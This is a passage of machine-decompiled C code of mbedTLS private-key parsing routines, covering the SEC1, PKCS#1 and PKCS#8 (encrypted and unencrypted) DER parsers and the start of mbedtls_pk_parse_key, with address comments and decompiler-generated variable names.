                                    if (v27 == 0) {
                                        int32_t v28 = g5; // 0x804e319
                                        int32_t v29 = mbedtls_asn1_get_mpi((int32_t *)g7, v28, g3 + 80); // 0x804e320
                                        if (v29 == 0) {
                                            int32_t v30 = g5; // 0x804e334
                                            int32_t v31 = mbedtls_asn1_get_mpi((int32_t *)g7, v30, g3 + 92); // 0x804e33b
                                            if (v31 == 0) {
                                                // 0x804e348
                                                *(int32_t *)(g3 + 4) = mbedtls_mpi_size(v14);
                                                int32_t v32 = g3; // 0x804e35b
                                                if (v4 == g5) {
                                                    int32_t v33 = mbedtls_rsa_check_privkey(v32); // 0x804e35e
                                                    g1 = v33;
                                                    if (v33 != 0) {
                                                        // 0x804e36b
                                                        mbedtls_rsa_free(g3, v30);
                                                        g1 = v33;
                                                        result = v33;
                                                        // branch -> 0x804e23d
                                                    } else {
                                                        result = 0;
                                                    }
                                                } else {
                                                    // 0x804e37e
                                                    mbedtls_rsa_free(v32, v30);
                                                    g1 = -0x3d66;
                                                    result = -0x3d66;
                                                    // branch -> 0x804e23d
                                                }
                                                // 0x804e23d
                                                g3 = v1;
                                                g7 = v2;
                                                g5 = v5;
                                                g2 = v9;
                                                return result;
                                            }
                                            v17 = v31;
                                            v15 = v30;
                                        } else {
                                            v17 = v29;
                                            v15 = v28;
                                        }
                                    } else {
                                        v17 = v27;
                                        v15 = v26;
                                    }
                                } else {
                                    v17 = v25;
                                    v15 = v24;
                                }
                            } else {
                                v17 = v23;
                                v15 = v22;
                            }
                        } else {
                            v17 = v21;
                            v15 = v20;
                        }
                    } else {
                        v17 = v19;
                        v15 = v18;
                    }
                }
                // 0x804e2a6
                mbedtls_rsa_free(g3, v15);
                // branch -> 0x804e238
                // 0x804e238
                result2 = v17 - 0x3d00;
                g1 = result2;
                result = result2;
                // branch -> 0x804e23d
            }
            // 0x804e23d
            g3 = v1;
            g7 = v2;
            g5 = v5;
            g2 = v9;
            return result;
        }
        v8 = v11;
    }
    // 0x804e238
    result2 = v8 - 0x3d00;
    g1 = result2;
    // branch -> 0x804e23d
    // 0x804e23d
    g3 = v1;
    g7 = v2;
    g5 = v5;
    g2 = v9;
    return result2;
}

// Address range: 0x804e390 - 0x804e3ef
int32_t pk_get_ecpubkey(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x804e396
    int32_t v2 = g1; // 0x804e399
    g3 = v2;
    int32_t v3 = g7; // 0x804e39b
    int32_t v4 = g6; // 0x804e39e
    g7 = v4;
    int32_t v5 = g5; // 0x804e3a0
    int32_t v6 = *(int32_t *)v2; // 0x804e3a3
    int32_t v7 = g4; // 0x804e3a5
    int32_t v8 = v7 + 136; // 0x804e3a5
    g6 = v8;
    g5 = v7;
    int32_t v9 = v4 - v6; // 0x804e3b6
    g4 = v9;
    int32_t v10 = mbedtls_ecp_point_read_binary(v7, v8, (char *)v6, v9); // 0x804e3c3
    g1 = v10;
    g6 = v8;
    if (v10 == 0) {
        // 0x804e3cf
        g1 = mbedtls_ecp_check_pubkey(g5, v8);
        // branch -> 0x804e3db
    }
    // 0x804e3db
    *(int32_t *)g3 = g7;
    g5 = v5;
    g3 = v1;
    g7 = v3;
    int32_t v11;
    g2 = v11;
    return g1;
}

// Address range: 0x804e3f0 - 0x804e6cf
int32_t pk_parse_key_sec1_der(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x804e3f6
    char * v2; // bp-40
    int32_t v3 = (int32_t)&v2;
    g3 = v3;
    int32_t v4 = g7; // 0x804e3fc
    int32_t v5;
    int32_t v6 = &v5; // 0x804e3ff_0
    g7 = v6;
    int32_t v7 = g6; // 0x804e402
    v2 = (char *)v7;
    int32_t v8 = g5; // 0x804e407
    int32_t v9 = g1; // 0x804e40a
    int32_t v10 = mbedtls_asn1_get_tag((int32_t *)&v2, g4 + v7, v6, 48); // 0x804e420
    int32_t v11 = v10; // 0x804e429
    int32_t v12;
    int32_t result5; // 0x804e429
    if (v10 == 0) {
        int32_t v13 = v5 + (int32_t)v2; // 0x804e446
        g5 = v13;
        int32_t v14;
        int32_t v15 = mbedtls_asn1_get_int((int32_t *)g3, v13, &v14); // 0x804e454
        if (v15 == 0) {
            // 0x804e45d
            g1 = -0x3d80;
            int32_t result = -0x3d80; // 0x804e43a_2
            if (v14 == 1) {
                int32_t v16 = mbedtls_asn1_get_tag((int32_t *)g3, g5, g7, 4); // 0x804e47b
                if (v16 == 0) {
                    int32_t v17 = v9 + 124; // 0x804e487
                    int32_t v18 = mbedtls_mpi_read_binary(v17, v2, v5); // 0x804e4a1
                    g1 = v18;
                    if (v18 == 0) {
                        int32_t v19 = v5 + (int32_t)v2; // 0x804e4ad
                        int32_t v20 = g5; // 0x804e4b0
                        v2 = (char *)v19;
                        int32_t v21; // 0x804e590
                        int32_t v22; // 0x804e5ac
                        int32_t v23; // 0x804e6a0
                        int32_t result4; // 0x804e500
                        if (v20 == v19) {
                            // 0x804e55d
                            v21 = mbedtls_ecp_mul(v9, v9 + 136, v17, v9 + 40, 0, 0);
                            g1 = v21;
                            g3 = v21;
                            if (v21 == 0) {
                                // 0x804e59f
                                v22 = mbedtls_ecp_check_privkey(v9, v17);
                                g1 = v22;
                                if (v22 != 0) {
                                    result4 = v22;
                                    // 0x804e4fd
                                    g6 = v9;
                                    mbedtls_ecp_keypair_free(v9);
                                    g1 = result4;
                                    result = result4;
                                    // branch -> 0x804e42e
                                } else {
                                    result = 0;
                                }
                            } else {
                                // 0x804e695
                                g6 = v9;
                                mbedtls_ecp_keypair_free(v9);
                                v23 = g3 - 0x3d00;
                                g1 = v23;
                                result = v23;
                                // branch -> 0x804e42e
                            }
                            // 0x804e42e
                            g3 = v1;
                            g7 = v4;
                            g5 = v8;
                            g2 = v12;
                            return result;
                        }
                        int32_t v24 = mbedtls_asn1_get_tag((int32_t *)g3, v20, g7, 160); // 0x804e4ce
                        g1 = v24;
                        int32_t v25; // 0x804e60c
                        int32_t v26; // 0x804e62f
                        int32_t v27; // 0x804e545
                        int32_t v28; // 0x804e61a
                        int32_t v29; // 0x804e63f
                        int32_t v30; // 0x804e613
                        int32_t result3; // 0x804e66f
                        int32_t v31; // 0x804e60f
                        if (v24 != 0) {
                            // 0x804e529
                            if (v24 != -98) {
                                // 0x804e67a
                                g6 = v9;
                                mbedtls_ecp_keypair_free(v9);
                                int32_t result2 = v24 - 0x3d00; // 0x804e68b
                                g1 = result2;
                                // branch -> 0x804e42e
                                // 0x804e42e
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v12;
                                return result2;
                            }
                            // 0x804e532
                            v27 = mbedtls_asn1_get_tag((int32_t *)g3, g5, g7, 161);
                            g5 = v27;
                            if (v27 != 0) {
                                // 0x804e554
                                if (v27 != -98) {
                                    // 0x804e664
                                    g1 = v9;
                                    mbedtls_ecp_keypair_free(v9);
                                    result3 = g5 - 0x3d00;
                                    g1 = result3;
                                    // branch -> 0x804e42e
                                    // 0x804e42e
                                    g3 = v1;
                                    g7 = v4;
                                    g5 = v8;
                                    g2 = v12;
                                    return result3;
                                }
                                // 0x804e55d
                                v21 = mbedtls_ecp_mul(v9, v9 + 136, v17, v9 + 40, 0, 0);
                                g1 = v21;
                                g3 = v21;
                                if (v21 == 0) {
                                    // 0x804e59f
                                    v22 = mbedtls_ecp_check_privkey(v9, v17);
                                    g1 = v22;
                                    if (v22 != 0) {
                                        result4 = v22;
                                        // 0x804e4fd
                                        g6 = v9;
                                        mbedtls_ecp_keypair_free(v9);
                                        g1 = result4;
                                        result = result4;
                                        // branch -> 0x804e42e
                                    } else {
                                        result = 0;
                                    }
                                } else {
                                    // 0x804e695
                                    g6 = v9;
                                    mbedtls_ecp_keypair_free(v9);
                                    v23 = g3 - 0x3d00;
                                    g1 = v23;
                                    result = v23;
                                    // branch -> 0x804e42e
                                }
                                // 0x804e42e
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v12;
                                return result;
                            }
                            // 0x804e609
                            v25 = v5 + (int32_t)v2;
                            g5 = v25;
                            v31 = g7;
                            v30 = g3;
                            v28 = mbedtls_asn1_get_bitstring_null((int32_t *)v30, v25, (int32_t *)v31);
                            if (v28 == 0) {
                                // 0x804e627
                                g1 = -0x3d66;
                                v26 = v5 + (int32_t)v2;
                                g6 = v26;
                                if (v26 == g5) {
                                    // 0x804e63a
                                    g4 = v9;
                                    g1 = v3;
                                    v29 = pk_get_ecpubkey(v30, v25, v31);
                                    g6 = v3;
                                    if (v29 == 0) {
                                        // 0x804e59f
                                        v22 = mbedtls_ecp_check_privkey(v9, v17);
                                        g1 = v22;
                                        if (v22 != 0) {
                                            result4 = v22;
                                            // 0x804e4fd
                                            g6 = v9;
                                            mbedtls_ecp_keypair_free(v9);
                                            g1 = result4;
                                            result = result4;
                                            // branch -> 0x804e42e
                                        } else {
                                            result = 0;
                                        }
                                    } else {
                                        // 0x804e64e
                                        g1 = -0x3d00;
                                        if (&v2 == (char **)-0x4e80) {
                                            // 0x804e55d
                                            v21 = mbedtls_ecp_mul(v9, v9 + 136, v17, v9 + 40, 0, 0);
                                            g1 = v21;
                                            g3 = v21;
                                            if (v21 == 0) {
                                                // 0x804e59f
                                                v22 = mbedtls_ecp_check_privkey(v9, v17);
                                                g1 = v22;
                                                if (v22 != 0) {
                                                    result4 = v22;
                                                    // 0x804e4fd
                                                    g6 = v9;
                                                    mbedtls_ecp_keypair_free(v9);
                                                    g1 = result4;
                                                    result = result4;
                                                    // branch -> 0x804e42e
                                                } else {
                                                    result = 0;
                                                }
                                            } else {
                                                // 0x804e695
                                                g6 = v9;
                                                mbedtls_ecp_keypair_free(v9);
                                                v23 = g3 - 0x3d00;
                                                g1 = v23;
                                                result = v23;
                                                // branch -> 0x804e42e
                                            }
                                            // 0x804e42e
                                            g3 = v1;
                                            g7 = v4;
                                            g5 = v8;
                                            g2 = v12;
                                            return result;
                                        }
                                        result = -0x3d00;
                                    }
                                    // 0x804e42e
                                    g3 = v1;
                                    g7 = v4;
                                    g5 = v8;
                                    g2 = v12;
                                    return result;
                                }
                                result = -0x3d66;
                            } else {
                                // 0x804e429
                                result5 = v28 - 0x3d00;
                                g1 = result5;
                                result = result5;
                                // branch -> 0x804e42e
                            }
                            // 0x804e42e
                            g3 = v1;
                            g7 = v4;
                            g5 = v8;
                            g2 = v12;
                            return result;
                        }
                        char * v32 = v2;
                        int32_t v33 = (int32_t)v32;
                        g4 = v33;
                        unsigned char v34 = *v32; // 0x804e4e0
                        int32_t v35 = v34; // 0x804e4e0
                        int32_t v36 = v35;
                        if (v34 != 48) {
                            // 0x804e4ef
                            g1 = -0x3d62;
                            if (v34 != 6) {
                                result4 = -0x3d62;
                                // 0x804e4fd
                                g6 = v9;
                                mbedtls_ecp_keypair_free(v9);
                                g1 = result4;
                                // branch -> 0x804e42e
                                // 0x804e42e
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v12;
                                return result4;
                            }
                        }
                        int32_t v37 = v33 + v5; // 0x804e5be
                        int32_t v38 = g3; // 0x804e5d3
                        int32_t v39;
                        int32_t v40 = mbedtls_asn1_get_tag((int32_t *)v38, v37, (int32_t)&v39, v35); // 0x804e5d6
                        g4 = v37;
                        if (v40 == 0) {
                            // 0x804e6ab
                            g1 = -0x3d66;
                            int32_t v41 = v39 + (int32_t)v2; // 0x804e6b6
                            v2 = (char *)v41;
                            if (v37 != v41) {
                                result4 = -0x3d66;
                                // 0x804e4fd
                                g6 = v9;
                                mbedtls_ecp_keypair_free(v9);
                                g1 = result4;
                                // branch -> 0x804e42e
                                // 0x804e42e
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v12;
                                return result4;
                            }
                        } else {
                            // 0x804e5e6
                            int32_t v42;
                            int32_t v43 = &v42; // 0x804e5e6_3
                            g1 = v43;
                            if (v40 != 0x3d00) {
                                result4 = v43;
                                // 0x804e4fd
                                g6 = v9;
                                mbedtls_ecp_keypair_free(v9);
                                g1 = result4;
                                // branch -> 0x804e42e
                                // 0x804e42e
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v12;
                                return result4;
                            }
                        }
                        // 0x804e5f1
                        g6 = v9;
                        g1 = &v36;
                        int32_t v44 = pk_use_ecparams(v38, v37); // 0x804e5f7
                        g1 = v44;
                        if (v44 != 0) {
                            result4 = v44;
                            // 0x804e4fd
                            g6 = v9;
                            mbedtls_ecp_keypair_free(v9);
                            g1 = result4;
                            // branch -> 0x804e42e
                            // 0x804e42e
                            g3 = v1;
                            g7 = v4;
                            g5 = v8;
                            g2 = v12;
                            return result4;
                        }
                        // 0x804e532
                        v27 = mbedtls_asn1_get_tag((int32_t *)g3, g5, g7, 161);
                        g5 = v27;
                        if (v27 != 0) {
                            // 0x804e554
                            if (v27 != -98) {
                                // 0x804e664
                                g1 = v9;
                                mbedtls_ecp_keypair_free(v9);
                                result3 = g5 - 0x3d00;
                                g1 = result3;
                                // branch -> 0x804e42e
                                // 0x804e42e
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v12;
                                return result3;
                            }
                            // 0x804e55d
                            v21 = mbedtls_ecp_mul(v9, v9 + 136, v17, v9 + 40, 0, 0);
                            g1 = v21;
                            g3 = v21;
                            if (v21 == 0) {
                                // 0x804e59f
                                v22 = mbedtls_ecp_check_privkey(v9, v17);
                                g1 = v22;
                                if (v22 != 0) {
                                    result4 = v22;
                                    // 0x804e4fd
                                    g6 = v9;
                                    mbedtls_ecp_keypair_free(v9);
                                    g1 = result4;
                                    result = result4;
                                    // branch -> 0x804e42e
                                } else {
                                    result = 0;
                                }
                            } else {
                                // 0x804e695
                                g6 = v9;
                                mbedtls_ecp_keypair_free(v9);
                                v23 = g3 - 0x3d00;
                                g1 = v23;
                                result = v23;
                                // branch -> 0x804e42e
                            }
                            // 0x804e42e
                            g3 = v1;
                            g7 = v4;
                            g5 = v8;
                            g2 = v12;
                            return result;
                        }
                        // 0x804e609
                        v25 = v5 + (int32_t)v2;
                        g5 = v25;
                        v31 = g7;
                        v30 = g3;
                        v28 = mbedtls_asn1_get_bitstring_null((int32_t *)v30, v25, (int32_t *)v31);
                        if (v28 == 0) {
                            // 0x804e627
                            g1 = -0x3d66;
                            v26 = v5 + (int32_t)v2;
                            g6 = v26;
                            if (v26 == g5) {
                                // 0x804e63a
                                g4 = v9;
                                g1 = v3;
                                v29 = pk_get_ecpubkey(v30, v25, v31);
                                g6 = v3;
                                if (v29 == 0) {
                                    // 0x804e59f
                                    v22 = mbedtls_ecp_check_privkey(v9, v17);
                                    g1 = v22;
                                    if (v22 != 0) {
                                        result4 = v22;
                                        // 0x804e4fd
                                        g6 = v9;
                                        mbedtls_ecp_keypair_free(v9);
                                        g1 = result4;
                                        result = result4;
                                        // branch -> 0x804e42e
                                    } else {
                                        result = 0;
                                    }
                                } else {
                                    // 0x804e64e
                                    g1 = -0x3d00;
                                    if (&v2 == (char **)-0x4e80) {
                                        // 0x804e55d
                                        v21 = mbedtls_ecp_mul(v9, v9 + 136, v17, v9 + 40, 0, 0);
                                        g1 = v21;
                                        g3 = v21;
                                        if (v21 == 0) {
                                            // 0x804e59f
                                            v22 = mbedtls_ecp_check_privkey(v9, v17);
                                            g1 = v22;
                                            if (v22 != 0) {
                                                result4 = v22;
                                                // 0x804e4fd
                                                g6 = v9;
                                                mbedtls_ecp_keypair_free(v9);
                                                g1 = result4;
                                                result = result4;
                                                // branch -> 0x804e42e
                                            } else {
                                                result = 0;
                                            }
                                        } else {
                                            // 0x804e695
                                            g6 = v9;
                                            mbedtls_ecp_keypair_free(v9);
                                            v23 = g3 - 0x3d00;
                                            g1 = v23;
                                            result = v23;
                                            // branch -> 0x804e42e
                                        }
                                        // 0x804e42e
                                        g3 = v1;
                                        g7 = v4;
                                        g5 = v8;
                                        g2 = v12;
                                        return result;
                                    }
                                    result = -0x3d00;
                                }
                                // 0x804e42e
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v12;
                                return result;
                            }
                            result = -0x3d66;
                        } else {
                            // 0x804e429
                            result5 = v28 - 0x3d00;
                            g1 = result5;
                            result = result5;
                            // branch -> 0x804e42e
                        }
                        // 0x804e42e
                        g3 = v1;
                        g7 = v4;
                        g5 = v8;
                        g2 = v12;
                        return result;
                    } else {
                        // 0x804e513
                        g6 = v9;
                        mbedtls_ecp_keypair_free(v9);
                        // branch -> 0x804e429
                        // 0x804e429
                        result5 = v18 - 0x3d00;
                        g1 = result5;
                        // branch -> 0x804e42e
                    }
                    // 0x804e42e
                    g3 = v1;
                    g7 = v4;
                    g5 = v8;
                    g2 = v12;
                    return result5;
                }
                // 0x804e429
                result5 = v16 - 0x3d00;
                g1 = result5;
                result = result5;
                // branch -> 0x804e42e
            }
            // 0x804e42e
            g3 = v1;
            g7 = v4;
            g5 = v8;
            g2 = v12;
            return result;
        }
        v11 = v15;
    }
    // 0x804e429
    result5 = v11 - 0x3d00;
    g1 = result5;
    // branch -> 0x804e42e
    // 0x804e42e
    g3 = v1;
    g7 = v4;
    g5 = v8;
    g2 = v12;
    return result5;
}

// Address range: 0x804e6d0 - 0x804e82f
int32_t pk_parse_key_pkcs8_unencrypted_der(int32_t a1, int32_t a2, int32_t a3) {
    int32_t v1 = g3; // 0x804e6d6
    int32_t v2; // bp-40
    int32_t v3 = &v2; // 0x804e6d9_0
    g3 = v3;
    int32_t v4 = g7; // 0x804e6dc
    int32_t v5;
    int32_t v6 = &v5; // 0x804e6df_0
    g7 = v6;
    int32_t v7 = g6; // 0x804e6e2
    v2 = v7;
    int32_t v8 = g5; // 0x804e6e7
    int32_t v9 = g1; // 0x804e6ea
    int32_t v10 = 0; // bp-44
    int32_t v11 = mbedtls_asn1_get_tag(&v2, g4 + v7, v6, 48); // 0x804e707
    int32_t v12 = v11; // 0x804e710
    int32_t v13;
    int32_t result2; // 0x804e710
    if (v11 == 0) {
        int32_t v14 = v5 + v2; // 0x804e72e
        g5 = v14;
        int32_t v15;
        int32_t v16 = mbedtls_asn1_get_int((int32_t *)g3, v14, &v15); // 0x804e73c
        if (v16 == 0) {
            int32_t v17 = v15; // 0x804e745
            g6 = v17;
            g1 = -0x3d80;
            int32_t result = -0x3d80; // 0x804e721_2
            if (v17 == 0) {
                // 0x804e751
                g6 = g5;
                g4 = &v10;
                g1 = v3;
                int32_t v18;
                int32_t v19 = pk_get_pk_alg(&v18, v14, (int32_t)&v15); // 0x804e75e
                v12 = v19;
                if (v19 == 0) {
                    int32_t v20 = g7; // 0x804e76f
                    int32_t v21 = mbedtls_asn1_get_tag((int32_t *)g3, g5, v20, 4); // 0x804e77a
                    if (v21 == 0) {
                        int32_t v22 = v5; // 0x804e783
                        g3 = v22;
                        if (v22 == 0) {
                            // 0x804e78a
                            g1 = -0x3d60;
                            // branch -> 0x804e715
                            // 0x804e715
                            g3 = v1;
                            g7 = v4;
                            g5 = v8;
                            g2 = v13;
                            return -0x3d60;
                        }
                        int32_t v23 = mbedtls_pk_info_from_type(v10); // 0x804e797
                        if (v23 == 0) {
                            // 0x804e7ee
                            g1 = -0x3c80;
                            result = -0x3c80;
                            // branch -> 0x804e715
                        } else {
                            // 0x804e7a0
                            g6 = v9;
                            int32_t v24 = mbedtls_pk_setup((int32_t *)v9, v23); // 0x804e7aa
                            g1 = v24;
                            if (v24 == 0) {
                                int32_t v25 = v10; // 0x804e7b7
                                int32_t v26; // 0x804e7cb
                                if (v25 == 1) {
                                    // 0x804e7bf
                                    g4 = v5;
                                    g1 = *(int32_t *)(v9 + 4);
                                    g6 = v2;
                                    v26 = pk_parse_key_pkcs1_der(v9, v23, v20);
                                    g1 = v26;
                                    if (v26 != 0) {
                                        // 0x804e7d8
                                        g6 = v9;
                                        mbedtls_pk_free((char *)v9);
                                        g1 = v26;
                                        result = v26;
                                        // branch -> 0x804e715
                                    } else {
                                        result = 0;
                                    }
                                    // 0x804e715
                                    g3 = v1;
                                    g7 = v4;
                                    g5 = v8;
                                    g2 = v13;
                                    return result;
                                }
                                // 0x804e7f8
                                if (v25 > 3) {
                                    // 0x804e7ee
                                    g1 = -0x3c80;
                                    // branch -> 0x804e715
                                    // 0x804e715
                                    g3 = v1;
                                    g7 = v4;
                                    g5 = v8;
                                    g2 = v13;
                                    return -0x3c80;
                                }
                                int32_t * v27 = (int32_t *)(v9 + 4); // 0x804e803_0
                                g6 = *v27;
                                g1 = &v18;
                                int32_t v28 = pk_use_ecparams(v9, v23); // 0x804e809
                                g1 = v28;
                                if (v28 == 0) {
                                    // 0x804e812
                                    g4 = v5;
                                    g1 = *v27;
                                    g6 = v2;
                                    int32_t v29 = pk_parse_key_sec1_der(v9, v23, v20); // 0x804e81e
                                    g1 = v29;
                                    if (v29 != 0) {
                                        v26 = v29;
                                        // 0x804e7d8
                                        g6 = v9;
                                        mbedtls_pk_free((char *)v9);
                                        g1 = v26;
                                        result = v26;
                                        // branch -> 0x804e715
                                    } else {
                                        result = 0;
                                    }
                                } else {
                                    v26 = v28;
                                    // 0x804e7d8
                                    g6 = v9;
                                    mbedtls_pk_free((char *)v9);
                                    g1 = v26;
                                    result = v26;
                                    // branch -> 0x804e715
                                }
                                // 0x804e715
                                g3 = v1;
                                g7 = v4;
                                g5 = v8;
                                g2 = v13;
                                return result;
                            }
                            result = v24;
                        }
                        // 0x804e715
                        g3 = v1;
                        g7 = v4;
                        g5 = v8;
                        g2 = v13;
                        return result;
                    }
                    v12 = v21;
                }
                // 0x804e710
                result2 = v12 - 0x3d00;
                g1 = result2;
                result = result2;
                // branch -> 0x804e715
            }
            // 0x804e715
            g3 = v1;
            g7 = v4;
            g5 = v8;
            g2 = v13;
            return result;
        }
        v12 = v16;
    }
    // 0x804e710
    result2 = v12 - 0x3d00;
    g1 = result2;
    // branch -> 0x804e715
    // 0x804e715
    g3 = v1;
    g7 = v4;
    g5 = v8;
    g2 = v13;
    return result2;
}

// Address range: 0x804e830 - 0x804ea9f
int32_t pk_parse_key_pkcs8_encrypted_der(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x804e830
    int32_t v1;
    char v2 = v1; // bp-2116
    int32_t v3 = g7; // 0x804e839
    int32_t v4 = &v2;
    g7 = v4;
    int32_t v5 = g4; // 0x804e845
    int32_t v6 = g5; // 0x804e84c
    int32_t v7 = g1; // 0x804e851
    memset(&v2, 0, 512);
    g4 = a2;
    if (a2 == 0) {
        // 0x804e867
        g7 = v3;
        g5 = v6;
        return -0x3c00;
    }
    int32_t v8 = g6; // 0x804e878
    int32_t v9 = v8;
    int32_t v10;
    int32_t v11 = &v10; // 0x804e87b_0
    g5 = v11;
    g3 = &v9;
    int32_t v12 = mbedtls_asn1_get_tag(&v9, v5 + v8, v11, 48); // 0x804e896
    int32_t v13 = v12; // 0x804e8a2
    if (v12 == 0) {
        // 0x804e8b8
        int32_t v14;
        int32_t v15 = &v14; // 0x804e8bb_0
        int32_t v16 = v10 + v9; // 0x804e8be
        int32_t v17;
        int32_t v18 = &v17; // 0x804e8c5_0
        int32_t v19 = mbedtls_asn1_get_alg((int32_t *)g3, v16, &v17, (char *)&v14); // 0x804e8d9
        if (v19 == 0) {
            int32_t v20 = mbedtls_asn1_get_tag((int32_t *)g3, v16, g5, 4); // 0x804e8fb
            if (v20 == 0) {
                // 0x804e904
                if (v10 > 2048) {
                    // 0x804e867
                    g7 = v3;
                    g5 = v6;
                    return -0x3e80;
                }
                // 0x804e916
                int32_t result; // 0x804e873_2
                int32_t v21;
                int32_t v22;
                char * v23;
                if (mbedtls_oid_get_pkcs12_pbe_alg(v18, &v22, &v21) == 0) {
                    int32_t v24 = mbedtls_pkcs12_pbe(v15, 0, v21, v22, a1, a2, v9, v10, g7); // 0x804e9fb
                    if (v24 == 0) {
                        // 0x804ea79
                        g4 = v10;
                        g6 = v4;
                        g1 = v7;
                        v23 = (char *)&v14;
                        result = pk_parse_key_pkcs8_unencrypted_der((int32_t)v23, 0, v21);
                        // branch -> 0x804e867
                    } else {
                        // 0x804ea04
                        if (v24 == -0x1e00) {
                            // 0x804e9b5
                            result = -0x3b80;
                            // branch -> 0x804e867
                        } else {
                            result = v24;
                        }
                    }
                    // 0x804e867
                    g7 = v3;
                    g5 = v6;
                    return result;
                }
                // 0x804e937
                int32_t str;
                int32_t v25;
                if (v25 == 10) {
                    // 0x804ea12
                    if (memcmp((char *)&g21, (char *)str, 10) == 0) {
                        int32_t result2 = mbedtls_pkcs12_pbe_sha1_rc4_128(v15, 0, a1, a2, v9, v10); // 0x804ea5f
                        if (result2 != 0) {
                            // 0x804e867
                            g7 = v3;
                            g5 = v6;
                            return result2;
                        }
                        // 0x804ea6c
                        if (v2 == 48) {
                            // 0x804ea79
                            g4 = v10;
                            g6 = v4;
                            g1 = v7;
                            v23 = (char *)&v14;
                            result = pk_parse_key_pkcs8_unencrypted_der((int32_t)v23, 0, a1);
                            // branch -> 0x804e867
                        } else {
                            // 0x804e9b5
                            result = -0x3b80;
                            // branch -> 0x804e867
                        }
                        // 0x804e867
                        g7 = v3;
                        g5 = v6;
                        return result;
                    }
                } else {
                    // 0x804e943
                    if (v25 == 9) {
                        // 0x804e94c
                        if (memcmp((char *)&g22, (char *)str, 9) == 0) {
                            int32_t v26 = mbedtls_pkcs5_pbes2(&v14, 0, (char *)a1, a2, v9, v10, g7); // 0x804e99d
                            if (v26 == 0) {
                                // 0x804ea79
                                g4 = v10;
                                g6 = v4;
                                g1 = v7;
                                v23 = (char *)&v14;
                                result = pk_parse_key_pkcs8_unencrypted_der((int32_t)v23, 0, a1);
                                // branch -> 0x804e867
                            } else {
                                // 0x804e9aa
                                if (v26 == -0x2e00) {
                                    // 0x804e9b5
                                    result = -0x3b80;
                                    // branch -> 0x804e867
                                } else {
                                    result = v26;
                                }
                            }
                            // 0x804e867
                            g7 = v3;
                            g5 = v6;
                            return result;
                        }
                    }
                }
                // 0x804ea8e
                // branch -> 0x804e867
                // 0x804e867
                g7 = v3;
                g5 = v6;
                return -0x3980;
            }
            v13 = v20;
        } else {
            v13 = v19;
        }
    }
    // 0x804e89f
    g7 = v3;
    g5 = v6;
    return v13 - 0x3d00;
}

// Address range: 0x804eaa0 - 0x804eeaf
int32_t mbedtls_pk_parse_key(int32_t a1, int32_t a2, int32_t a3, int32_t a4, int32_t a5) {
    // 0x804eaa0
    int32_t v1;
    char * v2 = (char *)v1;
    int32_t v3 = g5; // 0x804eaa6
    g5 = a3;
    int32_t v4;
    g7 = &v4;
    mbedtls_pem_init(&v4);
    int32_t v5 = g5; // 0x804eabd
    int32_t v6; // 0x804ead6
    int32_t v7; // 0x804eda7
    int32_t v8; // 0x804edc8
    int32_t v9; // 0x804eddf
    int32_t v10; // 0x804ee51
    int32_t v11; // 0x804ee80
    int32_t v12;
    int32_t v13;
    int32_t v14;
    int32_t v15; // 0x804ed88
    int32_t v16; // 0x804edd9
    int32_t v17; // 0x804ee3f
    int32_t v18; // 0x804ee5e
    int32_t v19; // 0x804ee8f
    if (v5 == 0) {
        // 0x804eac1
        g4 = g5;
        g1 = a1;
        g6 = a2;
        v14 = (int32_t)v2;
        v6 = pk_parse_key_pkcs8_encrypted_der(a4, a5, v14, v13, v12);
        g3 = v6;
        if (v6 == 0) {
            // 0x804eae5
            g5 = v3;
            return g3;
        }
        // 0x804ed88
        v15 = a1;
        g1 = v15;
        mbedtls_pk_free((char *)v15);
        if (g3 == -0x3b80) {
            // 0x804eae5
            g5 = v3;
            return g3;
        }
        // 0x804ed9f
        g6 = a2;
        g4 = g5;
        g1 = a1;
        v7 = pk_parse_key_pkcs8_unencrypted_der(v15, a5, v14);
        g1 = v7;
        g3 = v7;
        if (v7 == 0) {
            // 0x804eae5
            g5 = v3;
            return g3;
        }
        // 0x804edb6
        mbedtls_pk_free((char *)a1);
        v8 = mbedtls_pk_info_from_type(1);
        if (v8 == 0) {
            // 0x804ec40
            g5 = v3;
            return -0x3c80;
        }
        // 0x804edd5
        v16 = a1;
        v9 = mbedtls_pk_setup((int32_t *)v16, v8);
        g3 = v9;
        if (v9 == 0) {
            // 0x804ee27
            g4 = g5;
            g1 = *(int32_t *)(a1 + 4);
            g6 = a2;
            if (pk_parse_key_pkcs1_der(v16, v8, v14) != 0) {
                // 0x804ee3f
                v17 = a1;
                g1 = v17;
                mbedtls_pk_free((char *)v17);
                v10 = mbedtls_pk_info_from_type(2);
                if (v10 == 0) {
                    // 0x804ec40
                    g5 = v3;
                    return -0x3c80;
                }
                // 0x804ee5e
                v18 = a1;
                g6 = v18;
                if (mbedtls_pk_setup((int32_t *)v18, v10) == 0) {
                    // 0x804ee75
                    g4 = g5;
                    g1 = *(int32_t *)(a1 + 4);
                    g6 = a2;
                    v11 = pk_parse_key_sec1_der(v18, v10, v14);
                    g3 = v11;
                    if (v11 != 0) {
                        // 0x804ee8f
                        v19 = a1;
                        g1 = v19;
                        g3 = -0x3d00;
                        mbedtls_pk_free((char *)v19);
                        // branch -> 0x804eae5
                    }
                }
            }
        } else {
            // 0x804edea
            g3 = 0;
            // branch -> 0x804eae5
        }
        // 0x804eae5
        g5 = v3;
        return g3;
    }
    int32_t v20 = a2 - 1; // 0x804eafb
    char * v21; // 0x804eb23_0
    int32_t v22; // 0x804eb5c
    int32_t v23; // 0x804eb7a
    int32_t v24; // 0x804ec83
    int32_t v25; // 0x804ec99
    int32_t v26; // 0x804ecac
    int32_t v27; // 0x804ecc7
    int32_t v28; // 0x804ed1d
    int32_t v29; // 0x804ed3e
    int32_t v30;
    int32_t v31;
    char * v32;
    char * v33;
    int32_t v34;
    int32_t v35;
    int32_t v36; // 0x804eb59
    int32_t v37; // 0x804ec1a
    int32_t v38; // 0x804eca2
    if (*(char *)(v5 + v20) == 0) {
